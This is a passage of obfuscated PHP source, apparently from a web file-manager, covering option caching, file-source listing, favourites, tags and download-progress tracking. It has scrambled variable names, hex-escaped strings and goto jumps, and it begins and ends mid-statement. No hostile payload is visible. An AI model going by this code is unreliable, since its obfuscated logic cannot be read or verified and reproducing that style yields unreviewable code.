$ÃŒæé¿¾[$Ô€™ª÷û[32]]; break; case $Ô€™ª÷û[562]: $€»û‰±« = intval($ƒêöâÙ‰[$Ô€™ª÷û[375]] * 0.4); break; case $Ô€™ª÷û[564]: $€»û‰±« = intval($ƒêöâÙ‰[$Ô€™ª÷û[375]] * 0.2); break; case $Ô€™ª÷û[566]: $€»û‰±« = intval($ƒêöâÙ‰[$Ô€™ª÷û[375]] * 0.4); break; } $this->update($€»û‰±«); $this->sourceModelCopyFlag = !1; } public function sourceRemove($íœİ¬Ùú, $Öâãã¡) { $¶Á„µ©— =& $_SERVER[ì…™Î¶Ï]; $this->sourceModelCopyFlag = !0; $£Ì…üÃ = 1; if (isset($íœİ¬Ùú[$¶Á„µ©—[83]])) { $£Ì…üÃ = $íœİ¬Ùú[$¶Á„µ©—[83]][$¶Á„µ©—[81]] + $íœİ¬Ùú[$¶Á„µ©—[83]][$¶Á„µ©—[82]] + 1; } $this->update($£Ì…üÃ); $this->sourceModelCopyFlag = !1; } public function sourceMove($ŸšÆßÂø) { $this->sourceRemove($ŸšÆßÂø, !1); } public function curlProgress($¯§û”ô‡, $Ñ¡®Œù­, $ëº†ğ“¢, $è»øäÄı, $şí²Òª‘) { $³ñ—Û’¿ =& $_SERVER[ì…™Î¶Ï]; $¨¯‡ú¹Ø =& $this->task; if ($şí²Òª‘ > 0) { $¨¯‡ú¹Ø[$³ñ—Û’¿[1040]] = $³ñ—Û’¿[1698]; $¨¯‡ú¹Ø[$³ñ—Û’¿[1681]] = $³ñ—Û’¿[108]; if ($¨¯‡ú¹Ø[$³ñ—Û’¿[1679]]) { $¨¯‡ú¹Ø[$³ñ—Û’¿[1680]] = $şí²Òª‘; } if ($¨¯‡ú¹Ø[$³ñ—Û’¿[1682]]) { $¨¯‡ú¹Ø[$³ñ—Û’¿[1680]] = $şí²Òª‘ + $¨¯‡ú¹Ø[$³ñ—Û’¿[1682]]; } } else { if ($ëº†ğ“¢ > 0) { if ($¨¯‡ú¹Ø[$³ñ—Û’¿[1679]] == $Ñ¡®Œù­) { $¨¯‡ú¹Ø[$³ñ—Û’¿[1680]] = $ëº†ğ“¢; $¨¯‡ú¹Ø[$³ñ—Û’¿[1040]] = $³ñ—Û’¿[1699]; $¨¯‡ú¹Ø[$³ñ—Û’¿[1681]] = $³ñ—Û’¿[1173]; } } } $this->update(); } public function curlProgressStart($¬çòô»®) { } public function curlProgressEnd($»ª¦÷½Ì) { $”ò¬ú– =& $_SERVER[ì…™Î¶Ï]; $Ô¤åØô„ =& $this->task; $åÅ¬Ÿ£¬ = curl_getinfo($»ª¦÷½Ì); $äÚ¯Á±ñ = $åÅ¬Ÿ£¬[$”ò¬ú–[1700]]; if ($äÚ¯Á±ñ == -1) { $äÚ¯Á±ñ = $åÅ¬Ÿ£¬[$”ò¬ú–[1701]]; } if ($Ô¤åØô„[$”ò¬ú–[1681]] == $”ò¬ú–[108] && $äÚ¯Á±ñ) { $Ô¤åØô„[$”ò¬ú–[1682]] += $äÚ¯Á±ñ; } $this->update(); } } goto A¯Ñ“ ¤éÔ; DŒÃƒ˜áÂ–: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($£Ï¹ä½ = false, $ÅÃ’ƒ†õ = '', $”üŠò‘ = false) { $ã‘úúòƒ =& $_SERVER[ì…™Î¶Ï]; $İ¸œˆ·Ä = $this->cacheGet($ÅÃ’ƒ†õ); $ëã£‘‚ = $this->optionDefault($ÅÃ’ƒ†õ); $ëã£‘‚ = is_array($ëã£‘‚) ? $ëã£‘‚ : array(); if (is_array($İ¸œˆ·Ä)) { $İ¸œˆ·Ä = array_merge($ëã£‘‚, $İ¸œˆ·Ä); return $£Ï¹ä½ ? isset($İ¸œˆ·Ä[$£Ï¹ä½]) ? $İ¸œˆ·Ä[$£Ï¹ä½] : null : $İ¸œˆ·Ä; } $¶Ÿ‚«—› = $this->filterWhere(array($ã‘úúòƒ[33] => $ÅÃ’ƒ†õ)); $İ¸œˆ·Ä = $this->where($¶Ÿ‚«—›)->select(); $İ¸œˆ·Ä = array_to_keyvalue($İ¸œˆ·Ä, $ã‘úúòƒ[95], $ã‘úúòƒ[369]); foreach ($İ¸œˆ·Ä as $°‰Å¶« => $¸–Ïê©—) { if ($”üŠò‘ || in_array($°‰Å¶«, $this->jsonField)) { $İ¸œˆ·Ä[$°‰Å¶«] = json_decode($¸–Ïê©—, !0); } } $this->cacheSet($ÅÃ’ƒ†õ, $İ¸œˆ·Ä); $İ¸œˆ·Ä = array_merge($ëã£‘‚, $İ¸œˆ·Ä); return $£Ï¹ä½ ? $İ¸œˆ·Ä[$£Ï¹ä½] : $İ¸œˆ·Ä; } public function set($óœÏ²¼„, $•‹Ğ–´ = false, $ã ·ğ = '') { $¯¡¬ ¬É =& $_SERVER[ì…™Î¶Ï]; $this->cacheRemove($ã ·ğ); $ÄÕ¹¸àƒ = array(); $§Õ’ìú‹ = is_array($óœÏ²¼„) ? $óœÏ²¼„ : array($óœÏ²¼„ => $•‹Ğ–´); foreach ($§Õ’ìú‹ as $Ó™÷«» => $ìÈèÆë¨) { if (is_array($ìÈèÆë¨)) { $ìÈèÆë¨ = json_encode_force($ìÈèÆë¨); } $this->checkLength($ìÈèÆë¨, !1, $this->tableName . $¯¡¬ ¬É[4] . $óœÏ²¼„); $ìÈèÆë¨ = self::textEncode($ìÈèÆë¨); $§Õ’ìú‹ = array($¯¡¬ ¬É[33] => $ã ·ğ, $¯¡¬ ¬É[95] => $Ó™÷«», $¯¡¬ ¬É[369] => $ìÈèÆë¨); $ÄÕ¹¸àƒ[] = $this->filterWhere($§Õ’ìú‹); } if (!$ÄÕ¹¸àƒ) { return !0; } return $this->addAll($ÄÕ¹¸àƒ, array(), !0); } protected function optionDefault($Ø¾·Õù = '') { return !1; } public function setDeep($…¬ûğğ, $”äÓãõ† = false, $ŞÄíˆÃ = '') { $¸Ã©ˆ£â = explode($_SERVER[ì…™Î¶Ï][10], $…¬ûğğ); $¦‡ÃÊÖ = $this->get(); array_set_value($¦‡ÃÊÖ, $…¬ûğğ, $”äÓãõ†); $this->set($¸Ã©ˆ£â[0], $¦‡ÃÊÖ[$¸Ã©ˆ£â[0]], $ŞÄíˆÃ); } public function remove($¥–ê´û, $¦°Ì±î¿ = '') { $—é˜Ì¢° =& $_SERVER[ì…™Î¶Ï]; $this->cacheRemove($¦°Ì±î¿); $­ÀïÌ™õ = $this->filterWhere(array($—é˜Ì¢°[95] => $¥–ê´û, $—é˜Ì¢°[33] => $¦°Ì±î¿)); if (is_null($¥–ê´û)) { unset($­ÀïÌ™õ[$—é˜Ì¢°[95]]); } return $this->where($­ÀïÌ™õ)->delete(); } public function cacheSet($¼ÒøîĞĞ, $Ùİ–ÕĞ• = false) { return Cache::set($this->cacheKey($¼ÒøîĞĞ), $Ùİ–ÕĞ•); } public function cacheGet($şŠÙ‘Æ”) { return Cache::get($this->cacheKey($şŠÙ‘Æ”)); } public function cacheRemove($•Ì¨àãñ) { return Cache::remove($this->cacheKey($•Ì¨àãñ)); } protected function filterWhere($ ùĞëÒ‘) { return $ ùĞëÒ‘; } protected function cacheKey($Èò—ªŸ™) { return $Èò—ªŸ™; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\x75\x72\x63\145"; protected $tableMeta = array("\x74\x61\x62\154\145\116\x61\x6d\x65" => "\x69\157\x5f\x73\x6f\x75\162\143\145\x5f\155\145\x74\141", "\155\145\164\141\x46\x69\x65\154\144" => "\163\157\165\x72\x63\x65\111\x44"); protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\171\124\151\x6d\145", "\x74\151\155\145", "\151\x6e\163\x65\x72\164", "\146\165\x6e\x63\x74\x69\x6f\x6e"), array("\x63\162\145\141\x74\x65\x54\151\155\x65", "\164\x69\155\145", "\151\156\x73\x65\162\x74", "\146\x75\156\143\x74\x69\x6f\156"), array("\166\x69\x65\167\x54\151\155\x65", "\x74\x69\155\145", "\151\x6e\163\x65\162\164", "\146\165\156\x63\x74\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($§‘”ı´) { return $this->listSource(array($_SERVER[ì…™Î¶Ï][393] => $§‘”ı´)); } public function typeName($¨ÛÌ±ŒÈ) { static $î±ØÜæš = array(self::TYPE_SYSTEM => "\163\171\163\x74\145\x6d", self::TYPE_USER => "\165\x73\145\x72", self::TYPE_GROUP => "\147\162\157\x75\160"); return $î±ØÜæš[$¨ÛÌ±ŒÈ . $_SERVER[ì…™Î¶Ï][12]]; } public function sourceListInfo($¸¨€¤şµ, $È¿ š½Š = false) { $Ôçİ°Ã =& $_SERVER[ì…™Î¶Ï]; $¸¨€¤şµ = $¸¨€¤şµ ? $¸¨€¤şµ : array(); $¸¨€¤şµ = array_filter(array_unique($¸¨€¤şµ)); if (!$¸¨€¤şµ) { return array(); } $¦¯­Âšç = $this->where(array($Ôçİ°Ã[394] => array($Ôçİ°Ã[7], $¸¨€¤şµ)))->select(); $this->_listDataApply($¦¯­Âšç, $È¿ š½Š); return array_to_keyvalue($¦¯­Âšç, $Ôçİ°Ã[394]); } public function pathInfoFilter(&$”•¯›ë·) { $Ğ®ëÌÇ =& $_SERVER[ì…™Î¶Ï]; static $–çß§ğå = false; static $„Š•ƒÉ = false; static $îœÑ Ë± = false; if (!$–çß§ğå) { $Àİ¶Ç†Ú = $Ğ®ëÌÇ[395]; $Àİ¶Ç†Ú .= $Ğ®ëÌÇ[396]; $Àİ¶Ç†Ú .= $Ğ®ëÌÇ[397]; $œ»ëàì” = $Ğ®ëÌÇ[398]; $Ö‡óÒ¥› = explode($Ğ®ëÌÇ[50], $œ»ëàì”); $–çß§ğå = explode($Ğ®ëÌÇ[50], $Àİ¶Ç†Ú); $„Š•ƒÉ = array(); foreach ($–çß§ğå as $ÜÀö©¦) { if (in_array($ÜÀö©¦, $Ö‡óÒ¥›)) { continue; } $„Š•ƒÉ[] = $ÜÀö©¦; } $îœÑ Ë± = explode($Ğ®ëÌÇ[50], $Ğ®ëÌÇ[399]); } foreach ($îœÑ Ë± as $àûÙÙèğ) { if (isset($”•¯›ë·[$àûÙÙèğ])) { $”•¯›ë·[$àûÙÙèğ] = intval($”•¯›ë·[$àûÙÙèğ]); } } $”•¯›ë·[$Ğ®ëÌÇ[78]] = $Ğ®ëÌÇ[400] . $”•¯›ë·[$Ğ®ëÌÇ[394]] . $Ğ®ëÌÇ[401]; $”•¯›ë·[$Ğ®ëÌÇ[33]] = $”•¯›ë·[$Ğ®ëÌÇ[402]] == 1 ? $Ğ®ëÌÇ[79] : $Ğ®ëÌÇ[192]; $”•¯›ë·[$Ğ®ëÌÇ[403]] = $this->typeName($”•¯›ë·[$Ğ®ëÌÇ[403]]); if ($”•¯›ë·[$Ğ®ëÌÇ[402]] != 1) { $”•¯›ë·[$Ğ®ëÌÇ[167]] = $”•¯›ë·[$Ğ®ëÌÇ[404]]; unset($”•¯›ë·[$Ğ®ëÌÇ[404]]); } $¤èÍ¡õş = $–çß§ğå; if (isset($”•¯›ë·[$Ğ®ëÌÇ[405]]) && $”•¯›ë·[$Ğ®ëÌÇ[405]][$Ğ®ëÌÇ[406]] == -1) { $¤èÍ¡õş = $„Š•ƒÉ; } $”•¯›ë· = array_field_key($”•¯›ë·, $¤èÍ¡õş); return $”•¯›ë·; } public function listUserFav() { $¢¯ğ‚–“ =& $_SERVER[ì…™Î¶Ï]; $È×ĞÂğí = Model($¢¯ğ‚–“[407])->listData(); $ùÚÛˆ±‡ = array_filter_by_field($È×ĞÂğí, $¢¯ğ‚–“[33], $¢¯ğ‚–“[408]); $ùÚÛˆ±‡ = array_to_keyvalue($ùÚÛˆ±‡, $¢¯ğ‚–“[12], $¢¯ğ‚–“[78]); if ($ùÚÛˆ±‡) { $Ö¹÷ı¸È = $this->listSource(array($¢¯ğ‚–“[409] => array($¢¯ğ‚–“[410], $ùÚÛˆ±‡))); } $Ö¹÷ı¸È = array_to_keyvalue($Ö¹÷ı¸È[$¢¯ğ‚–“[364]], $¢¯ğ‚–“[394]); foreach ($È×ĞÂğí as &$¡®÷”åª) { $¡®÷”åª = array($¢¯ğ‚–“[411] => $¡®÷”åª[$¢¯ğ‚–“[392]], $¢¯ğ‚–“[412] => $¡®÷”åª[$¢¯ğ‚–“[32]], $¢¯ğ‚–“[413] => $¡®÷”åª[$¢¯ğ‚–“[78]], $¢¯ğ‚–“[414] => $¡®÷”åª[$¢¯ğ‚–“[33]], $¢¯ğ‚–“[415] => $¡®÷”åª[$¢¯ğ‚–“[193]], $¢¯ğ‚–“[416] => $¡®÷”åª[$¢¯ğ‚–“[86]]); if ($¡®÷”åª[$¢¯ğ‚–“[33]] == $¢¯ğ‚–“[408] && $Ö¹÷ı¸È[$¡®÷”åª[$¢¯ğ‚–“[78]]]) { $¡®÷”åª[$¢¯ğ‚–“[87]] = $Ö¹÷ı¸È[$¡®÷”åª[$¢¯ğ‚–“[78]]]; } } unset($¡®÷”åª); return $È×ĞÂğí; } public function listUserTag($š»‹‚Öí) { $ÙøÕÅÒ‘ =& $_SERVER[ì…™Î¶Ï]; if ($š»‹‚Öí && !is_array($š»‹‚Öí)) { $š»‹‚Öí = array($š»‹‚Öí); } $ÒâúßõÜ = Model($ÙøÕÅÒ‘[417])->listData(); $Œ¼ÓŠãÈ = array(); foreach ($ÒâúßõÜ as $›°ıºÜÅ) { $®Şâ¿… = $›°ıºÜÅ[$ÙøÕÅÒ‘[78]]; if (!$®Şâ¿…) { continue; } if (!isset($Œ¼ÓŠãÈ[$®Şâ¿…])) { $Œ¼ÓŠãÈ[$®Şâ¿…] = array(); } $Œ¼ÓŠãÈ[$®Şâ¿…][] = $›°ıºÜÅ[$ÙøÕÅÒ‘[418]]; } $¸ï¹•Œƒ = array(); foreach ($Œ¼ÓŠãÈ as $ÕÒ…¬§ => $®ù­–®) { $¤šçˆİÔ = !0; if (!$š»‹‚Öí) { $¸ï¹•Œƒ[] = $ÕÒ…¬§; continue; } foreach ($š»‹‚Öí as $Ò¹¿Êè¸) { if (!in_array($Ò¹¿Êè¸, $®ù­–®)) { $¤šçˆİÔ = !1; break; } } if ($¤šçˆİÔ) { $¸ï¹•Œƒ[] = $ÕÒ…¬§; } } if (!$¸ï¹•Œƒ) { return array(); } $»åãÓ÷¾ = $this->listSource(array($ÙøÕÅÒ‘[409] => array($ÙøÕÅÒ‘[410], $¸ï¹•Œƒ))); if (!$»åãÓ÷¾ || count($¸ï¹•Œƒ) == $»åãÓ÷¾[$ÙøÕÅÒ‘[361]][$ÙøÕÅÒ‘[362]]) { return $»åãÓ÷¾; } $íüçò¼¯ = array(); $¢¨îÏÊê = array_to_keyvalue($»åãÓ÷¾[$ÙøÕÅÒ‘[77]], $ÙøÕÅÒ‘[12], $ÙøÕÅÒ‘[394]); $°ÊïÒ¹‘ = array_to_keyvalue($»åãÓ÷¾[$ÙøÕÅÒ‘[76]], $ÙøÕÅÒ‘[12], $ÙøÕÅÒ‘[394]); $ïÁçÑĞÅ = array_merge($°ÊïÒ¹‘, $¢¨îÏÊê); foreach ($¸ï¹•Œƒ as $®Şâ¿…) { if (!in_array($®Şâ¿…, $ïÁçÑĞÅ)) { $íüçò¼¯[] = $®Şâ¿…; } } if ($íüçò¼¯) { Model($ÙøÕÅÒ‘[419])->removeBySource($íüçò¼¯); } return $»åãÓ÷¾; } public function listUserRecycle() { $û¾ÃÈ€á =& $_SERVER[ì…™Î¶Ï]; $ŸµĞÔ¦é = Model($û¾ÃÈ€á[420])->listData(); if (!$ŸµĞÔ¦é) { return array(); } $­ç£ç = array($û¾ÃÈ€á[409] => array($û¾ÃÈ€á[410], $ŸµĞÔ¦é), $û¾ÃÈ€á[421] => 1); return $this->listSource($­ç£ç); } public function listSource($«ˆÌòõË, $¡À©ğÄ‘ = 3000) { $õ´‘¾¸î =& $_SERVER[ì…™Î¶Ï]; if (!isset($«ˆÌòõË[$õ´‘¾¸î[422]])) { $«ˆÌòõË[$õ´‘¾¸î[422]] = 0; } $÷»³Ş¡Ÿ = $õ´‘¾¸î[423]; $’ó³ƒı = $this->field($÷»³Ş¡Ÿ)->_makeOrder()->where($«ˆÌòõË)->selectPage($¡À©ğÄ‘); $this->_listPageCheck($’ó³ƒı, $÷»³Ş¡Ÿ, $«ˆÌòõË); $this->_listDataApply($’ó³ƒı[$õ´‘¾¸î[364]]); $this->_listMake($’ó³ƒı); return $’ó³ƒı; } private function _listPageCheck(&$ÏÇ”¶ŞÚ, $Íµ«ä , $ûÏÄ«åã) { $¢Ùß¼ò¡ =& $_SERVER[ì…™Î¶Ï]; if (!is_array($ÏÇ”¶ŞÚ[$¢Ùß¼ò¡[361]])) { return; } $÷øûİ¬‹ = $ÏÇ”¶ŞÚ[$¢Ùß¼ò¡[361]]; if ($÷øûİ¬‹[$¢Ùß¼ò¡[363]] <= 1) { return; } if ($÷øûİ¬‹[$¢Ùß¼ò¡[362]] >= 100000) { return; } if (Model($¢Ùß¼ò¡[424])->get($¢Ùß¼ò¡[425]) != $¢Ùß¼ò¡[426]) { return; } $Íµ«ä  = str_replace(array($¢Ùß¼ò¡[53], $¢Ùß¼ò¡[337], $¢Ùß¼ò¡[226]), $¢Ùß¼ò¡[12], $Íµ«ä ); $Íµ«ä  = $¢Ùß¼ò¡[427] . str_replace($¢Ùß¼ò¡[50], $¢Ùß¼ò¡[428], $Íµ«ä ) . $¢Ùß¼ò¡[429]; $™»´ø³ü = $¢Ùß¼ò¡[430]; $™»´ø³ü = $™»´ø³ü . $¢Ùß¼ò¡[431]; $áè°Û÷ = $÷øûİ¬‹[$¢Ùß¼ò¡[358]] * ($÷øûİ¬‹[$¢Ùß¼ò¡[348]] - 1) . $¢Ùß¼ò¡[50] . $÷øûİ¬‹[$¢Ùß¼ò¡[358]]; $¤÷ä•ú = $this->_makeOrder(!0); $™÷—×İ¢ = $¢Ùß¼ò¡[427] . str_replace($¢Ùß¼ò¡[50], $¢Ùß¼ò¡[428], $¤÷ä•ú[0]); if (strpos($™÷—×İ¢, $¢Ùß¼ò¡[432])) { $™÷—×İ¢ = str_replace($¢Ùß¼ò¡[432], $¢Ùß¼ò¡[433], $™÷—×İ¢); } else { $™÷—×İ¢ .= $¢Ùß¼ò¡[434] . $¤÷ä•ú[1]; } $¥ò—º = array(); foreach ($ûÏÄ«åã as $àÌ¢˜Ö¾ => $€¼°×) { $¥ò—º[$¢Ùß¼ò¡[427] . $àÌ¢˜Ö¾] = $€¼°×; } $this->alias($¢Ùß¼ò¡[435])->field($Íµ«ä )->limit($áè°Û÷)->order($™÷—×İ¢); $®›àö…Ğ = $this->join($™»´ø³ü)->where($¥ò—º)->select(); if ($®›àö…Ğ) { $ÏÇ”¶ŞÚ[$¢Ùß¼ò¡[364]] = $®›àö…Ğ; } } protected function _makeOrder($•Ç®«¥ = false) { $åéƒ¿Š =& $_SERVER[ì…™Î¶Ï]; $°Ì¬™¬× = Model($åéƒ¿Š[436])->get($åéƒ¿Š[437]); $†ó™ÍĞ® = Model($åéƒ¿Š[436])->get($åéƒ¿Š[438]); $¹ÔÔ÷Ìê = array($åéƒ¿Š[439] => $åéƒ¿Š[440], $åéƒ¿Š[441] => $åéƒ¿Š[442]); $ÁóÈÈ·Â = array($åéƒ¿Š[32] => $åéƒ¿Š[32], $åéƒ¿Š[80] => $åéƒ¿Š[80], $åéƒ¿Š[167] => $åéƒ¿Š[404], $åéƒ¿Š[443] => $åéƒ¿Š[443], $åéƒ¿Š[444] => $åéƒ¿Š[445], $åéƒ¿Š[193] => $åéƒ¿Š[193], $åéƒ¿Š[86] => $åéƒ¿Š[86]); $¨§¾ùßñ = Input::get($åéƒ¿Š[446], $åéƒ¿Š[7], $°Ì¬™¬×, array_keys($ÁóÈÈ·Â)); $“‰–ÍÈÒ = Input::get($åéƒ¿Š[447], $åéƒ¿Š[7], $†ó™ÍĞ®, array_keys($¹ÔÔ÷Ìê)); if (!in_array($¨§¾ùßñ, array_keys($ÁóÈÈ·Â))) { $¨§¾ùßñ = $åéƒ¿Š[32]; } if (!in_array($“‰–ÍÈÒ, array_keys($¹ÔÔ÷Ìê))) { $¨§¾ùßñ = $åéƒ¿Š[439]; } if ($¨§¾ùßñ == $åéƒ¿Š[32]) { } $²¤ğµÀÊ = $åéƒ¿Š[448] . $ÁóÈÈ·Â[$¨§¾ùßñ] . $åéƒ¿Š[53] . $¹ÔÔ÷Ìê[$“‰–ÍÈÒ]; $²¤ğµÀÊ = rtrim(trim($²¤ğµÀÊ), $åéƒ¿Š[50]); if ($•Ç®«¥) { return array($²¤ğµÀÊ, $¹ÔÔ÷Ìê[$“‰–ÍÈÒ]); } return $this->order($²¤ğµÀÊ); } protected function _listDataApplyItem($ó•ıÕÅà, $ğ¦üÜÅ = false) { $ÏäÈÒÂ = array($ó•ıÕÅà); $this->_listDataApply($ÏäÈÒÂ, $ğ¦üÜÅ); return $ÏäÈÒÂ[0]; } protected function _listDataApply(&$öÂ×ÌáÓ, $·›Èß€ = false) { $°ûËÃ‰È =& $_SERVER[ì…™Î¶Ï]; if (!$öÂ×ÌáÓ) { $öÂ×ÌáÓ = array(); return; } $ÜÆ óŸ§ = array_to_keyvalue($öÂ×ÌáÓ, $°ûËÃ‰È[12], $°ûËÃ‰È[394]); $ÜÆ óŸ§ = array_unique($ÜÆ óŸ§); $this->_listSourceCache($öÂ×ÌáÓ); if (!$·›Èß€) { $this->_listAppendMeta($öÂ×ÌáÓ, $ÜÆ óŸ§); $this->_listAppendFileMeta($öÂ×ÌáÓ, $ÜÆ óŸ§); $this->_listAppendChildren($öÂ×ÌáÓ, $ÜÆ óŸ§); } $this->_listAppendPath($öÂ×ÌáÓ); $this->_listAppendAuth($öÂ×ÌáÓ); $this->_listAppendSourceInfo($öÂ×ÌáÓ, $ÜÆ óŸ§); $this->_listAppendUser($öÂ×ÌáÓ); $this->_listFilterInfo($öÂ×ÌáÓ, $·›Èß€); $this->_listAppendAuthSecret($öÂ×ÌáÓ); } protected function _listSourceCache($ç·„èÒá) { $üÍŒú¢¬ =& $_SERVER[ì…™Î¶Ï]; foreach ($ç·„èÒá as $¼á´ëù) { self::$cacheSourceInfo[$üÍŒú¢¬[449] . $¼á´ëù[$üÍŒú¢¬[394]]] = $¼á´ëù; } } protected function _listFilterInfo(&$°ìâÏ›, $‰ ÇÇº€ = false) { $ÂùêßÉ =& $_SERVER[ì…™Î¶Ï]; foreach ($°ìâÏ› as &$‘±ı‰À¬) { $‘±ı‰À¬ = $this->pathInfoFilter($‘±ı‰À¬); self::$cachePathInfo[$ÂùêßÉ[450] . intval($‰ ÇÇº€) . $ÂùêßÉ[451] . $‘±ı‰À¬[$ÂùêßÉ[394]]] = $‘±ı‰À¬; } unset($‘±ı‰À¬); } protected function _listMake(&$İìËî”Œ) { $îé²”õ« =& $_SERVER[ì…™Î¶Ï]; $İìËî”Œ[$îé²”õ«[77]] = array(); $İìËî”Œ[$îé²”õ«[76]] = array(); foreach ($İìËî”Œ[$îé²”õ«[364]] as $®”ı¸Ğë) { $è¤ ÷Ü¨ = $®”ı¸Ğë[$îé²”õ«[402]] == 1 ? $îé²”õ«[77] : $îé²”õ«[76]; $İìËî”Œ[$è¤ ÷Ü¨][] = $®”ı¸Ğë; } unset($İìËî”Œ[$îé²”õ«[364]]); } protected function _listAppendMeta(&$ï°‘µ·ä, $Şµ˜òÜ•) { $¨¨ìÃµ£ =& $_SERVER[ì…™Î¶Ï]; $÷ô—¦¹ = array($¨¨ìÃµ£[409] => array($¨¨ìÃµ£[410], $Şµ˜òÜ•)); $ÎŒíÉ = Model($¨¨ìÃµ£[452])->field($¨¨ìÃµ£[453])->where($÷ô—¦¹)->select(); if (!$ÎŒíÉ) { return; } $÷Ù …Š = array($¨¨ìÃµ£[454], $¨¨ìÃµ£[455], $¨¨ìÃµ£[433]); $¸±ûä…· = array(); foreach ($ÎŒíÉ as $œ†¨¬Ñ) { if (!isset($¸±ûä…·[$œ†¨¬Ñ[$¨¨ìÃµ£[394]]])) { $¸±ûä…·[$œ†¨¬Ñ[$¨¨ìÃµ£[394]]] = array(); } if (in_array($œ†¨¬Ñ[$¨¨ìÃµ£[95]], $÷Ù …Š)) { continue; } $¸±ûä…·[$œ†¨¬Ñ[$¨¨ìÃµ£[394]]][$œ†¨¬Ñ[$¨¨ìÃµ£[95]]] = $œ†¨¬Ñ[$¨¨ìÃµ£[369]]; } foreach ($ï°‘µ·ä as &$Ëì³ú¶å) { $Ëì³ú¶å[$¨¨ìÃµ£[456]] = !1; if (isset($¸±ûä…·[$Ëì³ú¶å[$¨¨ìÃµ£[394]]])) { $Ëì³ú¶å[$¨¨ìÃµ£[456]] = $¸±ûä…·[$Ëì³ú¶å[$¨¨ìÃµ£[394]]]; } if ($this->fileIsLock($Ëì³ú¶å) && $Ëì³ú¶å[$¨¨ìÃµ£[405]]) { $Ê×¹§à = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Ëì³ú¶å[$¨¨ìÃµ£[405]][$¨¨ìÃµ£[406]] = AuthModel::authDisable($Ëì³ú¶å[$¨¨ìÃµ£[405]][$¨¨ìÃµ£[406]], $Ê×¹§à); $Ëì³ú¶å[$¨¨ìÃµ£[405]][$¨¨ìÃµ£[457]][$¨¨ìÃµ£[405]] = $Ëì³ú¶å[$¨¨ìÃµ£[405]][$¨¨ìÃµ£[406]]; } } unset($Ëì³ú¶å); } protected function _listAppendFileMeta(&$úìšû«î, $‹òâŠûÈ) { $…Õ×µö‡ =& $_SERVER[ì…™Î¶Ï]; $ÔæÜÃ© = array_to_keyvalue($úìšû«î, $…Õ×µö‡[12], $…Õ×µö‡[458]); $ÔæÜÃ© = array_filter(array_unique($ÔæÜÃ©)); if (!$ÔæÜÃ©) { return; } $Íü°•  = array($…Õ×µö‡[459] => array($…Õ×µö‡[410], $ÔæÜÃ©)); $™àˆïª = $…Õ×µö‡[460]; $‰ã©–¾ = Model($…Õ×µö‡[461])->field($™àˆïª)->where($Íü°• )->select(); $‰ã©–¾ = array_to_keyvalue($‰ã©–¾, $…Õ×µö‡[458]); $şÙƒú½š = Model($…Õ×µö‡[462])->field($…Õ×µö‡[463])->where($Íü°• )->select(); $şÙƒú½š = $şÙƒú½š ? $şÙƒú½š : array(); $ÛøÖá…¤ = array(); foreach ($şÙƒú½š as $ ®Á·©˜) { if (!isset($ÛøÖá…¤[$ ®Á·©˜[$…Õ×µö‡[458]]])) { $ÛøÖá…¤[$ ®Á·©˜[$…Õ×µö‡[458]]] = array(); } $ÛøÖá…¤[$ ®Á·©˜[$…Õ×µö‡[458]]][$ ®Á·©˜[$…Õ×µö‡[95]]] = $ ®Á·©˜[$…Õ×µö‡[369]]; } foreach ($úìšû«î as &$õ÷¾ºÚ‚) { $İ‹ÓÖº = $õ÷¾ºÚ‚[$…Õ×µö‡[458]]; if (!$İ‹ÓÖº || !is_array($‰ã©–¾[$İ‹ÓÖº])) { continue; } $±À±Ğêª = $‰ã©–¾[$İ‹ÓÖº]; $±À±Ğêª[$…Õ×µö‡[80]] = $õ÷¾ºÚ‚[$…Õ×µö‡[80]]; $±À±Ğêª[$…Õ×µö‡[32]] = $õ÷¾ºÚ‚[$…Õ×µö‡[32]]; if (!isset(self::$cacheFileInfo[$…Õ×µö‡[464] . $İ‹ÓÖº])) { self::$cacheFileInfo[$…Õ×µö‡[464] . $İ‹ÓÖº] = array_merge(array(), $±À±Ğêª); } unset($‰ã©–¾[$İ‹ÓÖº][$…Õ×µö‡[78]]); $¾„óÉÉı = is_array($ÛøÖá…¤[$İ‹ÓÖº]) ? $ÛøÖá…¤[$İ‹ÓÖº] : array(); $õ÷¾ºÚ‚[$…Õ×µö‡[163]] = array_merge($¾„óÉÉı, $‰ã©–¾[$İ‹ÓÖº]); if (isset($õ÷¾ºÚ‚[$…Õ×µö‡[163]][$…Õ×µö‡[162]])) { $õ÷¾ºÚ‚[$…Õ×µö‡[162]] = json_decode($õ÷¾ºÚ‚[$…Õ×µö‡[163]][$…Õ×µö‡[162]], !0); unset($õ÷¾ºÚ‚[$…Õ×µö‡[163]][$…Õ×µö‡[162]]); } } unset($õ÷¾ºÚ‚); } protected function _listAppendSourceInfo(&$¿ö–â®“, $ñ˜ëÇ…è) { $ö‘ã©£¨ =& $_SERVER[ì…™Î¶Ï]; if (!defined($ö‘ã©£¨[465])) { return; } $È¥ä†Ò = Model($ö‘ã©£¨[466])->listData(); $²÷Ÿşûå = Model($ö‘ã©£¨[417])->listData(); $®’ÏšÇü = Model($ö‘ã©£¨[407])->listData(); $££‰š­ = Model($ö‘ã©£¨[467])->listSimple(); $İª¸ §Ç = array_to_keyvalue($È¥ä†Ò, $ö‘ã©£¨[392]); $¸É”ßóÍ = array_to_keyvalue_group($²÷Ÿşûå, $ö‘ã©£¨[78], $ö‘ã©£¨[418]); $íËÂÍ = array_to_keyvalue($®’ÏšÇü, $ö‘ã©£¨[78]); $İÍ“”ªÅ = array_to_keyvalue_group($££‰š­, $ö‘ã©£¨[394]); foreach ($¿ö–â®“ as &$ıÇø’­­) { $ıÇø’­­[$ö‘ã©£¨[87]] = array($ö‘ã©£¨[468] => 0, $ö‘ã©£¨[469] => 0, $ö‘ã©£¨[470] => 0); if (isset($íËÂÍ[$ıÇø’­­[$ö‘ã©£¨[394]]])) { $ıÇø’­­[$ö‘ã©£¨[87]][$ö‘ã©£¨[471]] = 1; $ıÇø’­­[$ö‘ã©£¨[87]][$ö‘ã©£¨[472]] = 